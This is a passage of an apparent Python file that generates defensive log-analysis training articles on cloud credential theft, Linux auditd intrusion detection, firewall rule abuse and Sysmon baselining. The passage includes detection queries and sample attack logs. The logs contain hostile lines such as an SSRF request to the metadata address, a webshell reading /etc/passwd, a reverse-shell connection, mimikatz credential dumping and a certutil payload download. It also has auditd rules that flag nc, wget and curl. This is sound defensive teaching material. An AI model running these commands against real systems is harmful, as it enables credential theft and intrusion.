metadata credentials were exfiltrated (likely via SSRF) and are being used
from an attacker-controlled machine.

### IAM reconnaissance - enumerate permissions

```json
{
  "eventTime": "2026-02-10T10:23:00Z",
  "eventName": "GetBucketAcl",
  "sourceIPAddress": "45.33.32.156",
  "requestParameters": {"bucketName": "acme-prod-data"},
  "errorCode": "AccessDenied"
}
{
  "eventTime": "2026-02-10T10:23:01Z",
  "eventName": "GetBucketAcl",
  "sourceIPAddress": "45.33.32.156",
  "requestParameters": {"bucketName": "acme-prod-backups"},
  "responseElements": null,
  "errorCode": null
}
```

**Annotation:** The attacker is testing which S3 buckets the role can access.
The first is denied; the second succeeds. This enumerate-then-exploit pattern
is typical of post-credential-theft behavior.

### Data exfiltration - S3 object download

```json
{
  "eventTime": "2026-02-10T10:25:00Z",
  "eventName": "GetObject",
  "sourceIPAddress": "45.33.32.156",
  "requestParameters": {
    "bucketName": "acme-prod-backups",
    "key": "db-dumps/production-2026-02-09.sql.gz"
  },
  "additionalEventData": {"bytesTransferredOut": 524288000}
}
```

## Query Examples

### KQL (Sentinel with CloudTrail connector) - External use of instance role

```kql
AWSCloudTrail
| where UserIdentityType == "AssumedRole"
| where UserIdentityArn contains "assumed-role"
| where SourceIpAddress !startswith "10." and SourceIpAddress !startswith "172."
    and SourceIpAddress != "AWS Internal"
| where SourceIpAddress !startswith "52.46." // AWS service IPs
| summarize EventCount=count(),
            Actions=make_set(EventName),
            ErrorCount=countif(isnotempty(ErrorCode))
    by UserIdentityArn, SourceIpAddress, bin(TimeGenerated, 1h)
| sort by EventCount desc
```

### Athena SQL - Find all actions by compromised role from external IPs

```sql
SELECT eventTime, eventName, sourceIPAddress, errorCode,
       requestParameters, userAgent
FROM cloudtrail_logs
WHERE useridentity.arn LIKE '%ProdAppRole%'
  AND sourceIPAddress NOT LIKE '10.%'
  AND sourceIPAddress NOT LIKE '172.%'
  AND sourceIPAddress != 'AWS Internal'
  AND eventTime BETWEEN '2026-02-10T00:00:00Z' AND '2026-02-11T00:00:00Z'
ORDER BY eventTime ASC
```

### SPL - Detect privilege escalation attempts

```spl
index=aws sourcetype=aws:cloudtrail
  (eventName=CreateUser OR eventName=AttachUserPolicy
   OR eventName=CreateAccessKey OR eventName=PutRolePolicy
   OR eventName=CreateRole OR eventName=AssumeRole)
  sourceIPAddress!=10.* sourceIPAddress!=172.* sourceIPAddress!="AWS Internal"
| stats count, values(eventName) as actions, values(errorCode) as errors
    by userIdentity.arn, sourceIPAddress
| where count > 3
| sort - count
```

## Correlation Logic

**SSRF-to-credential-theft detection chain:**

```
Step 1: Web application logs show SSRF payload
        (e.g., request to http://169.254.169.254/latest/meta-data/iam/)
Step 2: CloudTrail shows API calls from same role but different source IP
Step 3: The external IP was never previously associated with this role
Step 4: API calls include enumeration (List*, Describe*, Get*Acl)
Step 5: Followed by data access (GetObject, GetSecretValue)
```

**IAM abuse scoring:**

| Signal | Points |
|--------|--------|
| Instance role used from external IP | 40 |
| Multiple AccessDenied errors (permission enum) | 15 |
| S3 data access from external IP | 25 |
| IAM modification attempts | 30 |
| Secrets Manager or SSM Parameter access | 20 |
| New access key creation | 35 |
| **Alert threshold** | **50** |

## Timeline Reconstruction

| Time (UTC) | Event | Detail |
|------------|-------|--------|
| 10:15:00 | SSRF attempt | Web app log: request to 169.254.169.254 |
| 10:15:05 | Cred theft | Instance metadata credentials retrieved |
| 10:22:15 | ListBuckets | External IP enumerates S3 buckets |
| 10:23:00 | GetBucketAcl | Tests access to acme-prod-data (denied) |
| 10:23:01 | GetBucketAcl | Tests access to acme-prod-backups (success) |
| 10:23:30 | ListObjects | Lists objects in acme-prod-backups |
| 10:25:00 | GetObject | Downloads production DB dump (500MB) |
| 10:30:00 | CreateAccessKey | Attempts to create persistent access (denied) |
| 10:32:00 | GuardDuty alert | InstanceCredentialExfiltration detected |
| 10:35:00 | SOC response | Role credentials revoked |

## Conclusions

- An SSRF vulnerability in the web application allowed the attacker to steal
  EC2 instance role credentials from the metadata service
- The attacker enumerated S3 buckets and downloaded a 500MB production database dump
- An attempt to create persistent access via a new access key was blocked by IAM policy
- GuardDuty detected the abuse within 7 minutes of the first external API call
- IMDSv2 (requiring session tokens for metadata) would have prevented the SSRF attack
- The role had excessive permissions: backup bucket access was not needed

## MITRE ATT&CK References

| Technique | ID | Phase |
|-----------|----|-------|
| Unsecured Credentials: Cloud Instance Metadata API | T1552.005 | Credential Access |
| Cloud Service Discovery | T1526 | Discovery |
| Data from Cloud Storage | T1530 | Collection |
| Valid Accounts: Cloud Accounts | T1078.004 | Persistence |
| Server-Side Request Forgery | T1190 | Initial Access |
"""
    ))

    # ----------------------------------------------------------------
    # Article 13
    # ----------------------------------------------------------------
    articles.append((
        "Linux auditd Log Analysis for Intrusion Detection",
        ["log-analysis", "linux", "auditd", "intrusion-detection", "forensics"],
        r"""# Linux auditd Log Analysis for Intrusion Detection

## Scenario Setup

An anomaly detection system flagged a production Linux web server for unusual
outbound connections at 03:00 UTC. The server runs a LAMP stack and should only
communicate with the database server and an API gateway. You must analyze auditd
logs, syslog, and auth.log to determine if the server has been compromised.

**Environment:**
- Ubuntu 22.04 LTS web server (web-prod-01)
- auditd with STIG-aligned rules
- rsyslog forwarding to central SIEM
- Application: PHP-based customer portal
- Outbound connections restricted by iptables

## Key auditd Record Types

| Type | Description | Investigation Use |
|------|-------------|-------------------|
| SYSCALL | System call with arguments | Process execution, file access |
| EXECVE | Command and arguments | Exact command executed |
| PATH | File path accessed | What files were touched |
| SOCKADDR | Network socket address | Where connections went |
| USER_AUTH | Authentication attempt | Login tracking |
| USER_CMD | Sudo command | Privilege escalation tracking |
| PROCTITLE | Process title | Full command line |

## auditd Rules for Detection

```bash
# File integrity - critical system files
-w /etc/passwd -p wa -k identity
-w /etc/shadow -p wa -k identity
-w /etc/sudoers -p wa -k sudoers_change
-w /etc/crontab -p wa -k cron_mod

# Process execution
-a always,exit -F arch=b64 -S execve -k exec_log

# Network connections
-a always,exit -F arch=b64 -S connect -F a2=16 -k network_connect

# Suspicious tools
-w /usr/bin/wget -p x -k suspicious_tool
-w /usr/bin/curl -p x -k suspicious_tool
-w /usr/bin/nc -p x -k suspicious_tool
-w /usr/bin/nmap -p x -k suspicious_tool
```

## Sample Log Entries

### auditd - web shell execution via Apache

```
type=SYSCALL msg=audit(1707558000.000:1234): arch=c000003e syscall=59
  success=yes exit=0 a0=0x7f items=2 ppid=1542 pid=8844
  auid=4294967295 uid=33 gid=33 euid=33 comm="sh" exe="/bin/dash"
  key="exec_log"
type=EXECVE msg=audit(1707558000.000:1234): argc=3
  a0="sh" a1="-c" a2="id;uname -a;cat /etc/passwd"
type=PROCTITLE msg=audit(1707558000.000:1234):
  proctitle=sh -c id;uname -a;cat /etc/passwd
```

**Annotation:** The `uid=33` (www-data) and `ppid=1542` (Apache worker)
confirm this shell was spawned by the web server. The `auid=4294967295`
(unset) means no human user is associated -- this is automated execution.
The combined command (`id;uname -a;cat /etc/passwd`) is a classic webshell
fingerprint.

### auditd - reverse shell establishment

```
type=SYSCALL msg=audit(1707558060.000:1240): arch=c000003e syscall=42
  success=yes exit=0 pid=8845 uid=33 comm="bash" exe="/bin/bash"
  key="network_connect"
type=SOCKADDR msg=audit(1707558060.000:1240):
  saddr=02000539C0A80164   <-- port 1337, IP 192.168.1.100
```

**Annotation:** The `syscall=42` is `connect()`. The SOCKADDR decodes to:
family=02 (AF_INET), port=0539 (1337 decimal), IP=C0A80164 (192.168.1.100).
This is an outbound reverse shell from the www-data user to an attacker IP.

### auth.log - privilege escalation attempt

```
Feb 10 03:05:00 web-prod-01 sudo: www-data : TTY=unknown ; PWD=/var/www/html ;
  USER=root ; COMMAND=/bin/bash
Feb 10 03:05:00 web-prod-01 sudo: pam_unix(sudo:auth): auth could not
  identify password for [www-data]
```

**Annotation:** The www-data user (web server) attempted `sudo /bin/bash`.
This account has no sudo privileges, and the attempt from `TTY=unknown`
confirms execution from a non-interactive (web shell) context.

### auditd - crontab modification (persistence)

```
type=SYSCALL msg=audit(1707558120.000:1250): arch=c000003e syscall=257
  success=yes exit=3 pid=8850 uid=33 comm="bash" exe="/bin/bash"
  key="cron_mod"
type=PATH msg=audit(1707558120.000:1250):
  name="/var/spool/cron/crontabs/www-data" nametype=CREATE
```

**Annotation:** The attacker created a crontab for the www-data user.
The `nametype=CREATE` shows this is a new file, not a modification.

## Query Examples

### KQL - Detect web server spawning shells

```kql
Syslog
| where Computer == "web-prod-01"
| where SyslogMessage contains "exec_log"
| where SyslogMessage matches regex @"uid=33|uid=48"
| where SyslogMessage contains "exe=\"/bin/"
| parse SyslogMessage with * "exe=\"" ExecutedBinary "\"" *
| parse SyslogMessage with * "ppid=" ParentPID " " *
| where ExecutedBinary in ("/bin/bash", "/bin/dash", "/bin/sh", "/usr/bin/python3")
| project TimeGenerated, Computer, ExecutedBinary, ParentPID, SyslogMessage
| sort by TimeGenerated asc
```

### SPL - Decode auditd SOCKADDR for network connections

```spl
index=linux sourcetype=linux:audit type=SOCKADDR key=network_connect
| rex field=saddr "0200(?<hex_port>[0-9A-F]{4})(?<hex_ip>[0-9A-F]{8})"
| eval port=tonumber(hex_port, 16)
| eval ip=tonumber(substr(hex_ip,1,2),16).".".tonumber(substr(hex_ip,3,2),16)
        .".".tonumber(substr(hex_ip,5,2),16).".".tonumber(substr(hex_ip,7,2),16)
| where port > 0 AND ip!="127.0.0.1" AND ip!="0.0.0.0"
| lookup local_networks cidr as ip OUTPUT is_internal
| where NOT is_internal
| table _time, hostname, comm, exe, uid, ip, port
| sort _time
```

### EQL - Linux process chain: web server to shell to network

```eql
sequence by host.name with maxspan=5m
  [process where user.name == "www-data"
    and process.parent.name in ("apache2", "nginx", "php-fpm")
    and process.name in ("sh", "bash", "dash")]
  [network where user.name == "www-data"
    and destination.port > 1024
    and not cidrmatch(destination.ip, "10.0.0.0/8","172.16.0.0/12")]
```

## Correlation Logic

**Web server compromise detection pipeline:**

1. **auditd exec_log**: Apache/nginx UID spawning shell processes
2. **auditd network_connect**: Same UID making outbound connections
3. **auth.log**: Privilege escalation attempts from web server UID
4. **auditd cron_mod**: Persistence via crontab creation
5. **Application logs**: Identify the vulnerable endpoint

**SOCKADDR decoding reference:**

```
saddr field format: FFPPPPAAAAAAAA
FF = Address family (0200 = AF_INET)
PPPP = Port in hex (big-endian)
AAAAAAAA = IP in hex (each octet = 2 hex chars)

Example: 02000539C0A80164
  Family: 02 = AF_INET
  Port: 0539 = 1337
  IP: C0=192, A8=168, 01=1, 64=100 -> 192.168.1.100
```

## Timeline Reconstruction

| Time (UTC) | Event | Source | Detail |
|------------|-------|--------|--------|
| 02:55:00 | Web exploit | Apache access.log | POST to vulnerable upload.php |
| 02:55:15 | Webshell drop | auditd PATH | /var/www/html/images/cmd.php created |
| 03:00:00 | Shell exec | auditd EXECVE | www-data runs: id;uname -a |
| 03:01:00 | Reverse shell | auditd SOCKADDR | Connect to 192.168.1.100:1337 |
| 03:05:00 | Priv esc attempt | auth.log | www-data sudo /bin/bash (failed) |
| 03:08:00 | Kernel exploit | auditd EXECVE | ./dirty_pipe exploit executed |
| 03:08:05 | Root shell | auditd SYSCALL | uid=0 shell spawned |
| 03:10:00 | Persistence | auditd cron_mod | Root crontab created |
| 03:12:00 | SSH key | auditd PATH | /root/.ssh/authorized_keys modified |

## Conclusions

- The attacker exploited a file upload vulnerability in the PHP application
- A webshell was deployed and used to establish a reverse shell
- Initial sudo attempt failed, but a kernel exploit (Dirty Pipe style) achieved root
- Persistence was established via crontab and SSH authorized_keys
- auditd provided complete process and network telemetry that syslog alone would miss
- The UID=33 (www-data) executing shells was the first reliable detection signal

## MITRE ATT&CK References

| Technique | ID | Phase |
|-----------|----|-------|
| Exploit Public-Facing Application | T1190 | Initial Access |
| Server Software Component: Web Shell | T1505.003 | Persistence |
| Command and Scripting Interpreter: Unix Shell | T1059.004 | Execution |
| Exploitation for Privilege Escalation | T1068 | Privilege Escalation |
| Scheduled Task/Job: Cron | T1053.003 | Persistence |
| Account Manipulation: SSH Authorized Keys | T1098.004 | Persistence |
"""
    ))

    # ----------------------------------------------------------------
    # Article 14
    # ----------------------------------------------------------------
    articles.append((
        "Firewall Rule Change and Policy Violation Detection",
        ["log-analysis", "firewall", "policy-violation", "change-management", "compliance"],
        r"""# Firewall Rule Change and Policy Violation Detection

## Scenario Setup

During a quarterly compliance audit, the security team discovered that several
firewall rules were modified outside the change management process. Some changes
opened broad access to sensitive network segments. You must analyze firewall
configuration change logs, admin session logs, and CMDB records to identify
unauthorized changes, assess risk, and determine who made them.

**Environment:**
- Palo Alto PA-5250 (2 in HA pair: FW-PROD-01, FW-PROD-02)
- Panorama centralized management
- Network segments: DMZ, Corporate, Servers, PCI, OT/SCADA
- Change management: ServiceNow with CAB approval required
- ~450 active firewall rules

## Key Log Sources

| Log Source | Event Types | Retention |
|------------|-------------|-----------|
| Panorama System Log | Config changes, commits, admin logins | 1 year |
| Panorama Config Log | Before/after of every rule change | 1 year |
| PAN-OS Audit Log | CLI and API commands executed | 90 days |
| ServiceNow CMDB | Approved change requests | Indefinite |

## Sample Log Entries

### Panorama config log - rule modification

```
2026-02-08 02:15:33,serial=PA5250-01,type=CONFIG,subtype=edit,
  admin=j.network_admin,client=Web,cmd=set,
  path="/config/devices/entry/vsys/entry/rulebase/security/rules/entry[@name='Allow-Server-Access']",
  before="<source><member>10.3.0.0/24</member></source><destination><member>10.4.0.0/24</member></destination><service><member>tcp-443</member></service>",
  after="<source><member>any</member></source><destination><member>10.4.0.0/24</member></destination><service><member>any</member></service><action>allow</action>"
```

**Annotation:** Critical change: the rule "Allow-Server-Access" was modified from
`source=10.3.0.0/24, dest=10.4.0.0/24, service=tcp-443` to
`source=any, dest=10.4.0.0/24, service=any`. This opens the PCI segment
(10.4.0.0/24) to any source on any port. This is a PCI-DSS violation.

### Panorama system log - admin session at unusual time

```
2026-02-08 02:14:00,serial=Panorama-01,type=SYSTEM,subtype=auth,
  description="User 'j.network_admin' authenticated via password from 10.1.0.42",
  severity=informational
2026-02-08 02:14:05,serial=Panorama-01,type=SYSTEM,subtype=general,
  description="User 'j.network_admin' started web session"
```

**Annotation:** Admin login at 02:14 AM from an engineering workstation (10.1.0.42)
rather than the admin jump box (10.5.0.10). This violates the admin access policy.

### Panorama config log - commit operation

```
2026-02-08 02:18:00,serial=Panorama-01,type=SYSTEM,subtype=commit,
  admin=j.network_admin,result=Succeeded,
  description="Partial commit: device-group 'Production-FWs', template 'Prod-Template'"
```

### Rule creation with no change ticket

```
2026-02-08 02:20:15,serial=PA5250-01,type=CONFIG,subtype=set,
  admin=j.network_admin,client=Web,cmd=set,
  path="/config/devices/entry/vsys/entry/rulebase/security/rules/entry[@name='Temp-Access-Debug']",
  after="<source><member>any</member></source><destination><member>10.5.0.0/24</member></destination><service><member>tcp-22</member><member>tcp-3389</member></service><action>allow</action><description>temporary debug access</description>"
```

**Annotation:** A new rule "Temp-Access-Debug" was created allowing SSH and RDP
from any source to the management network (10.5.0.0/24). The description says
"temporary debug access" but there is no corresponding change ticket.

## Query Examples

### KQL - Detect firewall rule changes outside change windows

```kql
CommonSecurityLog
| where DeviceVendor == "Palo Alto Networks"
| where Activity == "CONFIG"
| where DeviceAction in ("edit", "set", "delete")
| extend ChangeHour = hourofday(TimeGenerated)
| extend ChangeDay = dayofweek(TimeGenerated)
| where ChangeHour < 6 or ChangeHour > 22 or ChangeDay in (0, 6)
| extend RuleName = extract(@"entry\[@name='([^']+)'\]", 1, Message)
| project TimeGenerated, SourceUserName, DeviceAction, RuleName,
          SourceIP, Message
| join kind=leftanti (
    externaldata(ChangeTicket:string, ScheduledStart:datetime, ScheduledEnd:datetime)
    [@"https://cmdb-api/approved-changes.csv"] with (format=csv)
    | where ScheduledStart <= TimeGenerated and ScheduledEnd >= TimeGenerated
) on $left.TimeGenerated
| sort by TimeGenerated asc
```

### SPL - Identify overly permissive rule changes

```spl
index=panorama sourcetype=pan:config subtype=edit OR subtype=set
| rex field=after "<source><member>(?<new_source>[^<]+)</member>"
| rex field=after "<destination><member>(?<new_dest>[^<]+)</member>"
| rex field=after "<service><member>(?<new_service>[^<]+)</member>"
| rex field=before "<source><member>(?<old_source>[^<]+)</member>"
| rex field=before "<service><member>(?<old_service>[^<]+)</member>"
| eval risk=case(
    new_source="any" AND new_service="any", "CRITICAL",
    new_source="any" OR new_service="any", "HIGH",
    1=1, "MEDIUM")
| where risk IN ("CRITICAL", "HIGH")
| table _time, admin, path, old_source, new_source, old_service, new_service, risk
| sort risk, _time
```

### SQL - Cross-reference changes with approved tickets

```sql
SELECT fc.change_time, fc.admin_user, fc.rule_name,
       fc.change_type, fc.risk_level,
       cm.ticket_id, cm.approval_status
FROM firewall_changes fc
LEFT JOIN change_management cm
  ON fc.rule_name = cm.affected_rule
  AND fc.change_time BETWEEN cm.window_start AND cm.window_end
WHERE cm.ticket_id IS NULL
  AND fc.change_time > NOW() - INTERVAL '30 days'
ORDER BY fc.risk_level DESC, fc.change_time ASC
```

## Correlation Logic

**Unauthorized change detection workflow:**

1. Collect all firewall config changes (edit, set, delete)
2. Cross-reference each change with the CMDB change calendar
3. Flag changes that occur outside approved change windows
4. Score each change for risk based on rule permissiveness
5. Correlate admin session source IP with approved jump box list

**Risk scoring for rule changes:**

| Change Type | Points |
|-------------|--------|
| Source changed to "any" | 30 |
| Service changed to "any" | 25 |
| Destination is PCI/OT segment | 30 |
| No matching change ticket | 20 |
| Admin session from non-jump-box | 15 |
| Change during off-hours | 10 |
| New "temporary" rule (no expiry) | 15 |
| **Critical threshold** | **50** |

**Compliance mapping:**

| Finding | Regulation | Control |
|---------|-----------|---------|
| Any-source to PCI zone | PCI-DSS | 1.2.1 - Restrict inbound/outbound traffic |
| No change ticket | PCI-DSS | 6.4.5 - Change control procedures |
| SSH/RDP to mgmt from any | NIST 800-53 | AC-17 - Remote Access |
| Off-hours change | SOX | ITGC - Change Management |

## Timeline Reconstruction

| Time (UTC) | Event | Source | Detail |
|------------|-------|--------|--------|
| 02:14:00 | Admin login | Panorama | j.network_admin from 10.1.0.42 |
| 02:15:33 | Rule edit | Config log | Allow-Server-Access: source any, svc any |
| 02:18:00 | Commit | System log | Changes pushed to production firewalls |
| 02:20:15 | New rule | Config log | Temp-Access-Debug: any -> mgmt SSH/RDP |
| 02:22:00 | Commit | System log | Second commit to production |
| 02:25:00 | RDP session | Security log | External RDP to 10.5.0.10 via new rule |
| 02:30:00 | Session end | Panorama | j.network_admin logged out |

## Conclusions

- Two unauthorized firewall changes were made at 02:15 AM with no change tickets
- The first change opened the PCI network segment to any source on any port
- The second change created a backdoor rule allowing SSH/RDP from any source
  to the management network
- The admin account was accessed from a non-authorized workstation
- An RDP session through the new rule was established 5 minutes after the commit
- This could indicate a compromised admin account or an insider threat
- Immediate remediation: revert both rules, disable admin account, investigate

## MITRE ATT&CK References

| Technique | ID | Phase |
|-----------|----|-------|
| Modify Cloud Compute Infrastructure | T1578 | Defense Evasion |
| Impair Defenses: Disable or Modify System Firewall | T1562.004 | Defense Evasion |
| Valid Accounts: Domain Accounts | T1078.002 | Initial Access |
| Remote Services: Remote Desktop Protocol | T1021.001 | Lateral Movement |
| Network Boundary Bridging | T1599 | Defense Evasion |
"""
    ))

    # ----------------------------------------------------------------
    # Article 15
    # ----------------------------------------------------------------
    articles.append((
        "Sysmon Process Create Logs Baselining and Anomaly Detection",
        ["log-analysis", "sysmon", "process-creation", "baselining", "anomaly-detection"],
        r"""# Sysmon Process Create Logs Baselining and Anomaly Detection

## Scenario Setup

Your organization has deployed Sysmon across 2,000 endpoints with a comprehensive
configuration. You receive approximately 5 million Sysmon Event ID 1 (Process
Create) events per day. You need to build a baseline of normal process execution
patterns and develop anomaly detection rules that surface high-fidelity alerts
without overwhelming the SOC with false positives.

**Environment:**
- Sysmon v15.15 with SwiftOnSecurity configuration
- Windows 10/11 fleet: 1,500 workstations, 500 servers
- Central SIEM: Elastic Security (8.12)
- Baseline period: 30 days of clean data
- Role-based profiles: Engineering, Finance, HR, IT, Executives

## Key Sysmon Event ID 1 Fields

| Field | Description | Baseline Value |
|-------|-------------|----------------|
| Image | Full path of executable | Set of known good paths |
| ParentImage | Parent process path | Expected parent-child pairs |
| CommandLine | Full command with arguments | Common argument patterns |
| User | Executing account | Expected user-to-process mapping |
| Hashes | SHA256/MD5/IMPHASH | Known good hash set |
| IntegrityLevel | Token integrity | Expected level per process |
| ParentCommandLine | Parent's command | Baseline parent context |
| OriginalFileName | PE header file name | Detects renamed binaries |

## Building the Baseline

### Step 1: Profile normal parent-child relationships

```
Expected parent-child pairs (high confidence):

explorer.exe -> chrome.exe, firefox.exe, outlook.exe, notepad.exe
services.exe -> svchost.exe, spoolsv.exe, msdtc.exe
svchost.exe -> wuauclt.exe, taskhostw.exe, RuntimeBroker.exe
winlogon.exe -> userinit.exe -> explorer.exe
cmd.exe -> common CLI tools (findstr, ping, ipconfig)
```

### Step 2: Profile process execution frequency

```
High frequency (>1000/day/fleet):
  svchost.exe, conhost.exe, RuntimeBroker.exe, backgroundTaskHost.exe

Medium frequency (100-1000/day/fleet):
  chrome.exe, outlook.exe, teams.exe, powershell.exe

Low frequency (<100/day/fleet):
  certutil.exe, bitsadmin.exe, mshta.exe, regsvr32.exe

Never expected:
  psexec.exe, mimikatz.exe, procdump.exe, nc.exe
```

## Sample Log Entries

### Sysmon Event ID 1 - normal process creation

```xml
<Event>
  <System>
    <EventID>1</EventID>
    <TimeCreated SystemTime="2026-02-10T09:00:15.123Z" />
    <Computer>FINWS042.corp.acme.local</Computer>
  </System>
  <EventData>
    <Data Name="Image">C:\Program Files\Google\Chrome\Application\chrome.exe</Data>
    <Data Name="OriginalFileName">chrome.exe</Data>
    <Data Name="ParentImage">C:\Windows\explorer.exe</Data>
    <Data Name="CommandLine">"C:\Program Files\Google\Chrome\Application\chrome.exe"</Data>
    <Data Name="User">CORP\j.martinez</Data>
    <Data Name="IntegrityLevel">Medium</Data>
    <Data Name="Hashes">SHA256=A1B2C3...</Data>
  </EventData>
</Event>
```

**Annotation:** Normal pattern: explorer.exe (user shell) launching Chrome.
Image path, original filename, and parent all match expected baseline.

### Sysmon Event ID 1 - renamed binary (anomaly)

```xml
<Event>
  <EventData>
    <Data Name="Image">C:\Users\j.martinez\Downloads\chrome_update.exe</Data>
    <Data Name="OriginalFileName">mimikatz.exe</Data>
    <Data Name="ParentImage">C:\Windows\System32\cmd.exe</Data>
    <Data Name="CommandLine">"C:\Users\j.martinez\Downloads\chrome_update.exe" sekurlsa::logonpasswords</Data>
    <Data Name="User">CORP\j.martinez</Data>
    <Data Name="IntegrityLevel">High</Data>
    <Data Name="Hashes">SHA256=E3B0C4...</Data>
  </EventData>
</Event>
```

**Annotation:** The `OriginalFileName` from the PE header is `mimikatz.exe` but
the file was renamed to `chrome_update.exe`. This is a clear evasion attempt.
The command line arguments (`sekurlsa::logonpasswords`) confirm credential dumping.

### Sysmon Event ID 1 - unusual parent-child (anomaly)

```xml
<Event>
  <EventData>
    <Data Name="Image">C:\Windows\System32\cmd.exe</Data>
    <Data Name="ParentImage">C:\Windows\System32\svchost.exe</Data>
    <Data Name="ParentCommandLine">C:\Windows\System32\svchost.exe -k netsvcs -p -s Schedule</Data>
    <Data Name="CommandLine">cmd.exe /c powershell -enc SQBFAFgA...</Data>
    <Data Name="User">CORP\SYSTEM</Data>
  </EventData>
</Event>
```

**Annotation:** The Task Scheduler service (svchost -k netsvcs Schedule) spawning
cmd.exe with an encoded PowerShell command. While scheduled tasks can spawn
processes, the encoded PowerShell payload is suspicious and warrants investigation.

## Query Examples

### KQL - Detect renamed binaries (OriginalFileName mismatch)

```kql
DeviceProcessEvents
| where Timestamp > ago(24h)
| where FileName != InitiatingProcessFileName
| extend OriginalName = parse_json(AdditionalFields).OriginalFileName
| where isnotempty(OriginalName)
| where OriginalName !~ FileName
| where OriginalName !in ("cmd.exe")
| project Timestamp, DeviceName, FileName, OriginalName,
          FolderPath, ProcessCommandLine, AccountName
| sort by Timestamp desc
```

### SPL - Anomalous parent-child process relationships

```spl
index=sysmon EventCode=1
| eval parent_child=ParentImage."->".Image
| stats count as exec_count, dc(Computer) as host_count,
        values(User) as users, values(CommandLine) as cmds
    by parent_child
| lookup baseline_parent_child parent_child OUTPUT expected
| where isnull(expected)
| where exec_count < 10
| sort exec_count
| table parent_child, exec_count, host_count, users, cmds
```

### KQL - Process execution from unusual directories

```kql
DeviceProcessEvents
| where Timestamp > ago(24h)
| where FolderPath !startswith "C:\\Windows\\"
    and FolderPath !startswith "C:\\Program Files"
    and FolderPath !startswith "C:\\Program Files (x86)"
| where FolderPath matches regex @"\\(Temp|tmp|Downloads|AppData\\Local\\Temp|Public|Recycle)"
| summarize ExecCount=count(),
            Hosts=dcount(DeviceName),
            Users=make_set(AccountName)
    by FileName, FolderPath, SHA256
| where Hosts < 3
| sort by ExecCount asc
```

### EQL - LOLBin execution chain

```eql
sequence by host.name with maxspan=5m
  [process where process.name in ("mshta.exe","regsvr32.exe","rundll32.exe",
    "certutil.exe","bitsadmin.exe","msiexec.exe")
    and process.parent.name in ("outlook.exe","winword.exe","excel.exe")]
  [process where process.name in ("powershell.exe","cmd.exe")
    and process.args : ("-enc*","-e *","hidden","bypass")]
```

## Correlation Logic

**Baselining methodology:**

1. **Collect 30 days** of Sysmon Event ID 1 data from clean environment
2. **Build frequency tables** for: process paths, parent-child pairs,
   command line patterns, user-to-process mappings
3. **Calculate rarity scores**: `rarity = 1 - (host_count / total_hosts)`
4. **Build allow-lists**: Top 95% of processes by frequency = expected
5. **Monitor deviations**: New processes, new parent-child, new paths

**Anomaly scoring model:**

| Factor | Weight | Calculation |
|--------|--------|-------------|
| Rare process (< 5 hosts) | 20 | `20 * (1 - host_count/total_hosts)` |
| Unusual parent-child | 25 | 25 if pair not in baseline |
| Renamed binary | 30 | 30 if OriginalFileName != Image |
| Execution from temp dir | 15 | 15 if path contains Temp/Downloads |
| Encoded command line | 20 | 20 if args match encoding pattern |
| High integrity unexpected | 10 | 10 if integrity=High for user process |
| **Alert threshold** | **50** | |

**False positive reduction strategies:**

- Exclude software deployment tools (SCCM, Intune, PDQ)
- Whitelist IT admin workstations for admin tools
- Allow developer machines broader baseline (compilers, IDEs)
- Tune based on first 2 weeks of alerts (80% of FPs eliminated)

## Timeline Reconstruction

Example anomaly investigation:

| Time (UTC) | Event | Score | Detail |
|------------|-------|-------|--------|
| 09:15:00 | Phishing delivery | - | Email with .lnk attachment |
| 09:18:22 | explorer -> cmd.exe | 15 | LNK file executed (unusual parent context) |
| 09:18:25 | cmd -> certutil.exe | 45 | certutil -urlcache -f http://... payload.exe |
| 09:18:30 | cmd -> payload.exe | 70 | Unknown binary from Temp, high integrity |
| 09:18:32 | payload -> powershell | 85 | Encoded PS from unknown parent |
| 09:19:00 | powershell -> net.exe | 60 | Discovery commands |

## Conclusions

- Process creation baselining reduces alert volume by 95% compared to
  signature-only detection
- The three highest-value anomaly signals are: renamed binaries,
  unusual parent-child pairs, and execution from temporary directories
- A 30-day baseline period captures most legitimate software patterns
- Role-based baselining (developer vs finance) is critical for reducing
  false positives in heterogeneous environments
- The OriginalFileName field in Sysmon is the single most valuable field
  for detecting evasion attempts

## MITRE ATT&CK References

| Technique | ID | Phase |
|-----------|----|-------|
| Masquerading: Rename System Utilities | T1036.003 | Defense Evasion |
| System Binary Proxy Execution: Mshta | T1218.005 | Defense Evasion |
| System Binary Proxy Execution: Regsvr32 | T1218.010 | Defense Evasion |
| Command and Scripting Interpreter: PowerShell | T1059.001 | Execution |
| Obfuscated Files or Information | T1027 | Defense Evasion |
"""
    ))

    # ----------------------------------------------------------------
    # Article 16
    # ----------------------------------------------------------------
    articles.append((
        "Correlating Multi-Source Alerts Into Attack Timelines",
        ["log-analysis", "correlation", "attack-timeline", "siem", "incident-response"],
        r"""# Correlating Multi-Source Alerts Into Attack Timelines

## Scenario Setup

Your SIEM generated 47 alerts over a 6-hour period across different detection
rules and log sources. The SOC tier-1 analyst escalated several as potentially
related. Your task is to correlate these disparate alerts into a coherent attack
timeline, determine if they represent a single incident, and assess the full
scope of the compromise.

**Environment:**
- Elastic SIEM with 35 active detection rules
- Log sources: Sysmon, Windows Security, Zeek, Palo Alto FW, CrowdStrike,
  O365, Azure AD, DNS, Proxy
- Alert fatigue: ~200 alerts/day, 15% true positive rate
- Correlation engine: Elastic detection rules + custom Python scripts

## The Correlation Challenge

| Problem | Description |
|---------|-------------|
| Time gaps | Attack steps may be hours or days apart |
| Different identifiers | IP vs hostname vs username vs process GUID |
| Multiple log sources | Each tells part of the story |
| Alert fatigue | Real attacks buried in noise |
| Pivoting | Attacker changes IPs, accounts, tools mid-attack |

## The 47 Alerts (Summary)

```
Alert ID | Time (UTC)       | Rule                           | Source    | Entity
---------|------------------|--------------------------------|-----------|--------
A-001    | 08:15:22         | Suspicious Email Attachment    | Email GW  | j.martinez
A-002    | 08:18:45         | Office Macro Execution         | Sysmon    | ENGWS042
A-003    | 08:18:47         | PowerShell Encoded Command     | Sysmon    | ENGWS042
A-004    | 08:19:00         | Outbound to Uncategorized URL  | Proxy     | 10.1.0.42
A-005    | 08:22:00         | New Scheduled Task Created     | Sysmon    | ENGWS042
A-006    | 09:00:00         | Beaconing Detected             | Zeek      | 10.1.0.42
A-007    | 09:15:00         | Mimikatz Behavior              | CrowdStrike| ENGWS042
A-008    | 09:16:00         | LSASS Memory Access            | Sysmon    | ENGWS042
A-009    | 09:20:00         | NTLM Auth from Unusual Source  | DC01      | svc_deploy
A-010    | 09:22:00         | Lateral Movement Type 3        | ENGWS015  | svc_deploy
... (37 more alerts across lateral movement, discovery, exfil, persistence)
